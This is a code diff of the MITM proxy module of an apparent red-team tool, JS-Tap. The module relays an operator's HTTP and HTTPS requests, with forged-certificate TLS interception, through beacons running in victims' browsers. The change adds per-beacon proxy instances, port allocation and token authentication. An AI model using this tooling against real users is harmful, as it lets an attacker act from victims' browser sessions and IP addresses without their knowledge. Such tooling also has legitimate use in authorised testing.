@@ -5,12 +5,15 @@ Operator points their browser at this proxy. Requests are serialized and sent
 over a WebSocket to a bex-beacon, which executes the actual fetch() from the
 victim's browser/IP. Responses flow back the same path.
 
-Runs in its own thread, started by the Flask app on demand.
+Supports multiple simultaneous proxy instances (one per beacon), each on its
+own port with its own auth token.
 """
 import io
+import os
 import ssl
 import json
 import uuid
+import secrets
 import socket
 import base64
 import logging
@@ -45,10 +48,6 @@ _pending_lock = threading.Lock()
 _spoof_config = {}
 _spoof_lock = threading.Lock()
 
-# Which beacon the proxy is currently routing through (set by /api/proxy/start)
-_active_beacon_uuid = None
-_proxy_running = False
-
 # CA key/cert (loaded once)
 _ca_key = None
 _ca_cert = None
@@ -77,20 +76,18 @@ def deliver_response(request_id, response_data):
         evt.set()
 
 
-def _send_to_beacon(request_obj, timeout=60):
-    """Send a serialized HTTP request to the active beacon and wait for response.
+def _send_to_beacon(beacon_uuid, request_obj, timeout=60):
+    """Send a serialized HTTP request to a specific beacon and wait for response.
     Returns the response dict or None on timeout."""
-    global _active_beacon_uuid
 
-    beacon = _active_beacon_uuid
-    if not beacon:
-        logger.warning("Proxy: No active beacon configured")
+    if not beacon_uuid:
+        logger.warning("Proxy: No beacon uuid provided")
         return None
 
     with _ws_connections_lock:
-        send_fn = _ws_connections.get(beacon)
+        send_fn = _ws_connections.get(beacon_uuid)
     if not send_fn:
-        logger.warning(f"Proxy: No WebSocket connection for beacon {beacon}")
+        logger.warning(f"Proxy: No WebSocket connection for beacon {beacon_uuid}")
         return None
 
     req_id = str(uuid.uuid4())
@@ -263,6 +260,45 @@ def _write_http_response(wfile, status, headers, body, set_cookies=None,
 
 
 # ---------------------------------------------------------------------------
+# Proxy authentication
+# ---------------------------------------------------------------------------
+
+def _check_auth(headers, expected_token):
+    """Validate Proxy-Authorization header. Returns True if auth is valid."""
+    auth_header = headers.get('Proxy-Authorization') or headers.get('proxy-authorization')
+    if not auth_header:
+        return False
+
+    # Expect: Basic base64(proxy:token)
+    if not auth_header.startswith('Basic '):
+        return False
+
+    try:
+        decoded = base64.b64decode(auth_header[6:]).decode('utf-8')
+    except Exception:
+        return False
+
+    # Username must be "proxy", password is the auth token
+    if ':' not in decoded:
+        return False
+
+    username, password = decoded.split(':', 1)
+    return username == 'proxy' and password == expected_token
+
+
+def _send_407(wfile):
+    """Send a 407 Proxy Authentication Required response."""
+    body = b'Proxy authentication required'
+    wfile.write(b"HTTP/1.1 407 Proxy Authentication Required\r\n")
+    wfile.write(b'Proxy-Authenticate: Basic realm="JS-Tap"\r\n')
+    wfile.write(f"Content-Length: {len(body)}\r\n".encode('latin-1'))
+    wfile.write(b"Connection: close\r\n")
+    wfile.write(b"\r\n")
+    wfile.write(body)
+    wfile.flush()
+
+
+# ---------------------------------------------------------------------------
 # Proxy handler
 # ---------------------------------------------------------------------------
 
@@ -286,17 +322,27 @@ class ProxyRequestHandler(socketserver.BaseRequestHandler):
         rfile = self.request.makefile('rb', buffering=0)
         wfile = self.request.makefile('wb')
 
+        # Get per-instance beacon_uuid and auth_token from the server object
+        beacon_uuid = getattr(self.server, 'beacon_uuid', None)
+        auth_token = getattr(self.server, 'auth_token', None)
+
         try:
             result = _read_http_request(rfile)
             if not result:
                 return
             method, target, http_ver, headers, body = result
 
+            # Check proxy authentication if a token is set
+            if auth_token and not _check_auth(headers, auth_token):
+                logger.info(f"Proxy: Auth failed from {self.client_address[0]}:{self.client_address[1]}")
+                _send_407(wfile)
+                return
+
             if method == 'CONNECT':
                 logger.info(f"Proxy: CONNECT {target}")
-                self._handle_connect(target, wfile, rfile)
+                self._handle_connect(target, wfile, rfile, beacon_uuid, auth_token)
             else:
-                self._handle_plain_http(method, target, headers, body, wfile)
+                self._handle_plain_http(method, target, headers, body, wfile, beacon_uuid)
         finally:
             try:
                 rfile.close()
@@ -307,7 +353,7 @@ class ProxyRequestHandler(socketserver.BaseRequestHandler):
             except Exception:
                 pass
 
-    def _handle_plain_http(self, method, url, headers, body, wfile):
+    def _handle_plain_http(self, method, url, headers, body, wfile, beacon_uuid):
         """Forward a plain HTTP request through the beacon."""
         logger.info(f"Proxy: {method} {url}")
         origin = headers.get('Origin', headers.get('origin', ''))
@@ -317,7 +363,7 @@ class ProxyRequestHandler(socketserver.BaseRequestHandler):
             _write_http_response(wfile, 204, {}, b'', request_origin=origin)
             return
 
-        resp = _send_to_beacon({
+        resp = _send_to_beacon(beacon_uuid, {
             'method': method,
             'url': url,
             'headers': dict(headers),
@@ -338,7 +384,7 @@ class ProxyRequestHandler(socketserver.BaseRequestHandler):
         _write_http_response(wfile, status, resp_headers, resp_body,
                              set_cookies=set_cookies, request_origin=origin)
 
-    def _handle_connect(self, target, wfile, rfile):
+    def _handle_connect(self, target, wfile, rfile, beacon_uuid, auth_token):
         """MITM a CONNECT tunnel: terminate TLS, read inner HTTP, proxy via beacon."""
         host, _, port = target.partition(':')
         port = int(port) if port else 443
@@ -370,9 +416,8 @@ class ProxyRequestHandler(socketserver.BaseRequestHandler):
             logger.info(f"Proxy: TLS handshake FAILED for {host}: {e}")
             return
         finally:
-            import os as _os
-            _os.unlink(cert_file.name)
-            _os.unlink(key_file.name)
+            os.unlink(cert_file.name)
+            os.unlink(key_file.name)
 
         logger.info(f"Proxy: TLS handshake OK for {host}")
 
@@ -403,7 +448,7 @@ class ProxyRequestHandler(socketserver.BaseRequestHandler):
                         break
                     continue
 
-                resp = _send_to_beacon({
+                resp = _send_to_beacon(beacon_uuid, {
                     'method': method,
                     'url': url,
                     'headers': dict(headers),
@@ -447,55 +492,183 @@ class ThreadedProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 
 
 # ---------------------------------------------------------------------------
-# Start / stop
+# ProxyInstance / ProxyManager — multi-instance proxy management
 # ---------------------------------------------------------------------------
 
-_server_instance = None
-_server_thread = None
+# Port range for auto-allocation
+_PORT_RANGE_START = 10000
+_PORT_RANGE_END = 10099
 
 
-def start_proxy(port=8445):
-    """Start the MITM proxy server in a background thread."""
-    global _server_instance, _server_thread, _proxy_running, _ca_key, _ca_cert
+class ProxyInstance:
+    """Encapsulates per-proxy state for one beacon."""
 
-    if _proxy_running:
-        logger.info("Proxy: Already running")
-        return
-
-    # Ensure CA exists
-    _ca_key, _ca_cert = ensure_ca()
-
-    _server_instance = ThreadedProxyServer(('0.0.0.0', port), ProxyRequestHandler)
-    _server_thread = threading.Thread(target=_server_instance.serve_forever, daemon=True)
-    _server_thread.start()
-    _proxy_running = True
-    logger.info(f"Proxy: MITM proxy listening on 0.0.0.0:{port}")
+    def __init__(self, beacon_uuid, port, auth_token):
+        self.beacon_uuid = beacon_uuid
+        self.port = port
+        self.auth_token = auth_token
+        self.server = None
+        self.thread = None
+        self.running = False
 
 
-def stop_proxy():
-    """Shut down the proxy server."""
-    global _server_instance, _server_thread, _proxy_running, _active_beacon_uuid
+class ProxyManager:
+    """Manages multiple proxy instances, one per beacon."""
 
-    if _server_instance:
-        _server_instance.shutdown()
-        _server_instance = None
-    _server_thread = None
-    _proxy_running = False
-    _active_beacon_uuid = None
-    logger.info("Proxy: Stopped")
+    def __init__(self):
+        self._instances = {}   # beacon_uuid -> ProxyInstance
+        self._lock = threading.Lock()
+
+    def _find_available_port(self):
+        """Find the lowest available port in the range by test-binding."""
+        used_ports = {inst.port for inst in self._instances.values()}
+        for port in range(_PORT_RANGE_START, _PORT_RANGE_END + 1):
+            if port in used_ports:
+                continue
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.bind(('0.0.0.0', port))
+                sock.close()
+                return port
+            except OSError:
+                continue
+        return None
+
+    def start_proxy(self, beacon_uuid, port=0):
+        """Start a proxy instance for a beacon. Auto-allocates port if port=0.
+        Returns the ProxyInstance or None on failure."""
+        global _ca_key, _ca_cert
+
+        with self._lock:
+            # If already running for this beacon, return existing
+            if beacon_uuid in self._instances:
+                inst = self._instances[beacon_uuid]
+                if inst.running:
+                    return inst
+
+            # Ensure CA exists (first proxy start loads it)
+            if _ca_key is None or _ca_cert is None:
+                _ca_key, _ca_cert = ensure_ca()
+
+            # Allocate port
+            if port == 0:
+                port = self._find_available_port()
+                if port is None:
+                    logger.error("Proxy: No available ports in range")
+                    return None
+
+            auth_token = secrets.token_urlsafe(32)
+
+            inst = ProxyInstance(beacon_uuid, port, auth_token)
+
+            try:
+                server = ThreadedProxyServer(('0.0.0.0', port), ProxyRequestHandler)
+            except OSError as e:
+                logger.error(f"Proxy: Failed to bind port {port}: {e}")
+                return None
+
+            # Store per-instance state on the server object so handler can access it
+            server.beacon_uuid = beacon_uuid
+            server.auth_token = auth_token
+
+            inst.server = server
+            inst.thread = threading.Thread(target=server.serve_forever, daemon=True)
+            inst.thread.start()
+            inst.running = True
+
+            self._instances[beacon_uuid] = inst
+            logger.info(f"Proxy: Instance started for beacon {beacon_uuid} on port {port}")
+            return inst
+
+    def stop_proxy(self, beacon_uuid):
+        """Stop the proxy instance for a specific beacon. Returns True if stopped."""
+        with self._lock:
+            inst = self._instances.pop(beacon_uuid, None)
+        if not inst:
+            return False
+        if inst.server:
+            inst.server.shutdown()
+        inst.running = False
+        logger.info(f"Proxy: Instance stopped for beacon {beacon_uuid}")
+        return True
+
+    def stop_all(self):
+        """Stop all proxy instances."""
+        with self._lock:
+            instances = list(self._instances.values())
+            self._instances.clear()
+        for inst in instances:
+            if inst.server:
+                inst.server.shutdown()
+            inst.running = False
+        logger.info("Proxy: All instances stopped")
+
+    def get_instance(self, beacon_uuid):
+        """Get the ProxyInstance for a beacon, or None."""
+        with self._lock:
+            return self._instances.get(beacon_uuid)
+
+    def get_all_instances(self):
+        """Return dict of beacon_uuid -> ProxyInstance for all running proxies."""
+        with self._lock:
+            return dict(self._instances)
+
+    def is_running_for(self, beacon_uuid):
+        """Check if a proxy is running for a specific beacon."""
+        with self._lock:
+            inst = self._instances.get(beacon_uuid)
+            return inst is not None and inst.running
 
 
+# ---------------------------------------------------------------------------
+# Module-level singleton and public API functions
+# ---------------------------------------------------------------------------
+
+_manager = ProxyManager()
+
+
+def start_proxy_for_beacon(beacon_uuid, port=0):
+    """Start a proxy instance for a beacon. Returns the ProxyInstance."""
+    return _manager.start_proxy(beacon_uuid, port=port)
+
+
+def stop_proxy_for_beacon(beacon_uuid):
+    """Stop the proxy for a specific beacon. Returns True if stopped."""
+    return _manager.stop_proxy(beacon_uuid)
+
+
+def stop_all_proxies():
+    """Stop all running proxy instances."""
+    _manager.stop_all()
+
+
+def get_proxy_instance(beacon_uuid):
+    """Get the ProxyInstance for a beacon, or None."""
+    return _manager.get_instance(beacon_uuid)
+
+
+def get_all_proxy_instances():
+    """Return dict of all running proxy instances."""
+    return _manager.get_all_instances()
+
+
+def is_proxy_running_for(beacon_uuid):
+    """Check if a proxy is running for a specific beacon."""
+    return _manager.is_running_for(beacon_uuid)
+
+
+# Backward-compat: is_proxy_running() returns True if ANY proxy is running
 def is_proxy_running():
-    return _proxy_running
+    return len(_manager.get_all_instances()) > 0
 
 
+# Backward-compat: get_active_beacon() returns first running beacon uuid (or None)
 def get_active_beacon():
-    return _active_beacon_uuid
-
-
-def set_active_beacon(beacon_uuid):
-    global _active_beacon_uuid
-    _active_beacon_uuid = beacon_uuid
+    instances = _manager.get_all_instances()
+    if instances:
+        return next(iter(instances))
+    return None
 
 
 def has_ws_connection(beacon_uuid):
